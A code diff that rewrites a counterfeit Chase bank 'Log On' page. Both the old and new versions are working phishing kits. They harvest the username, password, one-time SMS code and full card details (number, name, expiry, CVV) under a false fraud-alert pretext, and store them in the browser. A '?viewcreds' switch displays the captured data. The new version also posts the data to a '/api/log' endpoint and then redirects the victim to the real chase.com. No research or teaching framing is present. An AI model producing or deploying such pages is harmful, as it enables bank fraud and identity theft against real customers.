@@ -1,266 +1,101 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chase Online - Sign In</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: url('https://picsum.photos/1080/1920?blur=5') no-repeat center center fixed;
-      background-size: cover;
-      color: #333;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      overflow: hidden;
-    }
-    .container {
-      position: relative;
-      text-align: center;
-      padding: 20px;
-      width: 100%;
-    }
-    .header-logo {
-      text-align: left;
-      margin-bottom: 20px;
-    }
-    .header-logo svg {
-      width: 120px;
-      height: auto;
-    }
-    .login-box {
-      background: rgba(255, 255, 255, 0.95);
-      padding: 20px;
-      border-radius: 12px;
-      width: 90%;
-      max-width: 350px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
-      margin: 0 auto;
-    }
-    .form-group {
-      margin-bottom: 15px;
-      text-align: left;
-    }
-    .form-group label {
-      display: block;
-      color: #666;
-      font-size: 14px;
-      margin-bottom: 5px;
-    }
-    .form-group input {
-      width: 100%;
-      padding: 8px;
-      border: none;
-      border-bottom: 2px solid #0054a6;
-      font-size: 16px;
-      outline: none;
-      background: transparent;
-    }
-    .form-group .show-toggle {
-      float: right;
-      color: #0054a6;
-      font-size: 12px;
-      cursor: pointer;
-    }
-    .checkbox-group {
-      display: flex;
-      justify-content: space-between;
-      margin-bottom: 15px;
-      font-size: 12px;
-      color: #666;
-    }
-    .checkbox-group input {
-      margin-right: 5px;
-    }
-    button {
-      width: 100%;
-      padding: 10px;
-      background: #0054a6;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      font-size: 16px;
-      cursor: pointer;
-      transition: background 0.2s;
-    }
-    button:hover {
-      background: #003d7a;
-    }
-    .links a {
-      display: block;
-      margin: 10px 0;
-      color: #0054a6;
-      text-decoration: none;
-      font-size: 12px;
-    }
-    .links a:hover {
-      text-decoration: underline;
-    }
-    .social {
-      margin: 20px 0;
-      font-size: 14px;
-      color: #666;
-    }
-    .social a {
-      color: #666;
-      margin: 0 5px;
-      text-decoration: none;
-      font-size: 16px;
-    }
-    .footer {
-      font-size: 10px;
-      color: #666;
-      margin-top: 20px;
-      padding-bottom: 20px;
-    }
-    .footer a {
-      color: #666;
-      margin: 0 5px;
-      text-decoration: none;
-    }
-    .footer a:hover {
-      text-decoration: underline;
-    }
-    .hidden {
-      display: none;
-    }
-    .prompt {
-      font-size: 14px;
-      color: #333;
-      margin-bottom: 15px;
-    }
-    .card-group {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 10px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chase Online - Log On</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #fff; margin: 0; padding: 0; }
+        .header { background-color: #117aca; padding: 10px 20px; display: flex; align-items: center; }
+        .logo { height: 40px; }
+        .container { max-width: 400px; margin: 40px auto; padding: 20px; border: 1px solid #ccc; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        h1 { color: #117aca; font-size: 24px; }
+        label { display: block; margin: 10px 0 5px; font-weight: bold; }
+        input { width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; }
+        button { background-color: #117aca; color: #fff; padding: 12px; width: 100%; border: none; font-weight: bold; cursor: pointer; }
+        button:hover { background-color: #0e5f9e; }
+        .links { text-align: center; margin-top: 20px; }
+        .links a { color: #117aca; text-decoration: none; margin: 0 10px; }
+        .footer { text-align: center; font-size: 12px; color: #666; margin-top: 40px; }
+        #otp-section, #card-section { display: none; }
+        .message { color: #117aca; font-weight: bold; margin-bottom: 20px; }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <div class="header-logo">
-      <svg width="120" height="56" viewBox="0 0 120 56" xmlns="http://www.w3.org/2000/svg">
-        <g fill="white">
-          <path d="M14 0 L28 0 L42 14 L42 42 L28 56 L14 56 L0 42 L0 14 Z" transform="translate(0,0)"/>
-          <text x="20" y="40" font-family="Arial" font-weight="bold" font-size="32" fill="white">CHASE</text>
-        </g>
-      </svg>
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/ed/Chase_logo_2007.svg" alt="Chase Logo" class="logo">
     </div>
-    <div class="login-box">
-      <div id="login-step">
-        <form id="login-form">
-          <div class="form-group">
-            <label for="username">Username</label>
-            <input type="text" id="username" name="username" placeholder="Username" required>
-          </div>
-          <div class="form-group">
-            <label for="password">Password</label>
-            <input type="password" id="password" name="password" placeholder="Password" required>
-            <span class="show-toggle" onclick="togglePassword('password')">Show</span>
-          </div>
-          <div class="checkbox-group">
-            <label><input type="checkbox" name="remember"> Remember me</label>
-            <label><input type="checkbox" name="use-token"> Use token</label>
-          </div>
-          <button type="submit">Sign in</button>
-        </form>
-        <div class="links">
-          <a href="#">Forgot username/password? ></a>
-          <a href="#">Not Enrolled? Sign Up Now. ></a>
+    <div class="container">
+        <h1>Log On to Your Account</h1>
+        <div id="login-section">
+            <form id="login-form">
+                <label for="username">User ID</label>
+                <input type="text" id="username" required>
+                <label for="password">Password</label>
+                <input type="password" id="password" required>
+                <button type="submit">Log On</button>
+            </form>
+            <div class="links">
+                <a href="#">Forgot User ID / Password?</a>
+                <a href="#">Not Enrolled? Sign Up Now</a>
+            </div>
         </div>
-      </div>
-
-      <div id="code-step" class="hidden">
-        <div class="prompt">A 6-digit code has been sent to your device. Enter it below to verify.</div>
-        <form id="code-form">
-          <div class="form-group">
-            <label for="code">6-Digit Code</label>
-            <input type="text" id="code" name="code" placeholder="Enter code" maxlength="6" required>
-          </div>
-          <button type="submit">Verify</button>
-        </form>
-      </div>
-
-      <div id="card-step" class="hidden">
-        <div class="prompt">To lift the fraudulent activity off your account, enter your card credentials below.</div>
-        <form id="card-form">
-          <div class="form-group">
-            <label for="card-name">Name on Card</label>
-            <input type="text" id="card-name" name="card-name" placeholder="Name on Card" required>
-          </div>
-          <div class="form-group">
-            <label for="card-number">Card Number</label>
-            <input type="text" id="card-number" name="card-number" placeholder="Card Number" maxlength="16" required>
-          </div>
-          <div class="card-group">
-            <div class="form-group">
-              <label for="expiration">Expiration Date</label>
-              <input type="text" id="expiration" name="expiration" placeholder="MM/YY" maxlength="5" required>
-            </div>
-            <div class="form-group">
-              <label for="cvv">CVV</label>
-              <input type="text" id="cvv" name="cvv" placeholder="CVV" maxlength="3" required>
-            </div>
-          </div>
-          <button type="submit">Submit</button>
-        </form>
-      </div>
-
-      <div class="social">
-        Follow us: <a href="#">&#xf09a;</a> <a href="#">&#xf16d;</a> <a href="#">&#xf17e;</a> <a href="#">&#xf0e1;</a>
-      </div>
-      <div class="footer">
-        <a href="#">Contact us</a> <a href="#">Privacy</a> <a href="#">Security</a> <a href="#">Terms of use</a> <a href="#">Accessibility</a><br>
-        <a href="#">SAFE Act: Chase Mortgage Loan Originators</a> <a href="#">Fair Lending</a> <a href="#">About Chase</a><br>
-        <a href="#">J.P. Morgan</a> <a href="#">JPMorgan Chase & Co.</a> <a href="#">Careers</a> <a href="#">Español</a>
-      </div>
+        <div id="otp-section">
+            <p class="message">A 6-digit code has been sent to your device via text.</p>
+            <form id="otp-form">
+                <label for="otp">Enter Code</label>
+                <input type="text" id="otp" maxlength="6" required>
+                <button type="submit">Continue</button>
+            </form>
+        </div>
+        <div id="card-section">
+            <p class="message">To lift the fraudulent activity on your account, you must provide your card details.</p>
+            <form id="card-form">
+                <label for="cardnumber">Card Number</label>
+                <input type="text" id="cardnumber" required>
+                <label for="name">Name on Card</label>
+                <input type="text" id="name" required>
+                <label for="expiry">Expiration Date (MM/YY)</label>
+                <input type="text" id="expiry" required>
+                <label for="cvv">Security Code</label>
+                <input type="text" id="cvv" maxlength="3" required>
+                <button type="submit">Verify</button>
+            </form>
+        </div>
     </div>
-  </div>
-  <script>
-    let creds = localStorage.getItem('credentials') ? localStorage.getItem('credentials').split('\n') : [];
-
-    function togglePassword(id) {
-      const field = document.getElementById(id);
-      field.type = field.type === 'password' ? 'text' : 'password';
-    }
-
-    document.getElementById('login-form').addEventListener('submit', (e) => {
-      e.preventDefault();
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-      creds.push(`Username: ${username}, Password: ${password}`);
-      localStorage.setItem('credentials', creds.join('\n'));
-      document.getElementById('login-step').classList.add('hidden');
-      document.getElementById('code-step').classList.remove('hidden');
-    });
-
-    document.getElementById('code-form').addEventListener('submit', (e) => {
-      e.preventDefault();
-      const code = document.getElementById('code').value;
-      creds.push(`Code: ${code}`);
-      localStorage.setItem('credentials', creds.join('\n'));
-      document.getElementById('code-step').classList.add('hidden');
-      document.getElementById('card-step').classList.remove('hidden');
-    });
-
-    document.getElementById('card-form').addEventListener('submit', (e) => {
-      e.preventDefault();
-      const cardName = document.getElementById('card-name').value;
-      const cardNumber = document.getElementById('card-number').value;
-      const expiration = document.getElementById('expiration').value;
-      const cvv = document.getElementById('cvv').value;
-      creds.push(`Card Name: ${cardName}, Number: ${cardNumber}, Exp: ${expiration}, CVV: ${cvv}`);
-      localStorage.setItem('credentials', creds.join('\n'));
-      alert('Account verified. Thank you.');
-      window.location.reload();
-    });
-
-    if (window.location.search === '?viewcreds') {
-      alert(localStorage.getItem('credentials') || 'No credentials captured yet.');
-    }
-  </script>
-</body>
+    <div class="footer">
+        © 2025 JPMorgan Chase & Co. All rights reserved.
+    </div>
+    <script>
+        let creds = {};
+        let storedCreds = localStorage.getItem('phishingCreds') || '';
+        if (location.search === '?viewcreds') {
+            document.body.innerHTML = '<h1>Captured Credentials (Local Storage)</h1><pre>' + storedCreds.replace(/\n/g, '<br>') + '</pre>';
+        } else {
+            document.getElementById('login-form').addEventListener('submit', (e) => {
+                e.preventDefault();
+                creds.username = document.getElementById('username').value;
+                creds.password = document.getElementById('password').value;
+                document.getElementById('login-section').style.display = 'none';
+                document.getElementById('otp-section').style.display = 'block';
+            });
+            document.getElementById('otp-form').addEventListener('submit', (e) => {
+                e.preventDefault();
+                creds.otp = document.getElementById('otp').value;
+                document.getElementById('otp-section').style.display = 'none';
+                document.getElementById('card-section').style.display = 'block';
+            });
+            document.getElementById('card-form').addEventListener('submit', (e) => {
+                e.preventDefault();
+                creds.cardnumber = document.getElementById('cardnumber').value;
+                creds.name = document.getElementById('name').value;
+                creds.expiry = document.getElementById('expiry').value;
+                creds.cvv = document.getElementById('cvv').value;
+                fetch('/api/log', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(creds) }).catch(() => {});
+                storedCreds += JSON.stringify(creds) + '\n';
+                localStorage.setItem('phishingCreds', storedCreds);
+                window.location.href = 'https://www.chase.com/';
+            });
+        }
+    </script>
 </html>
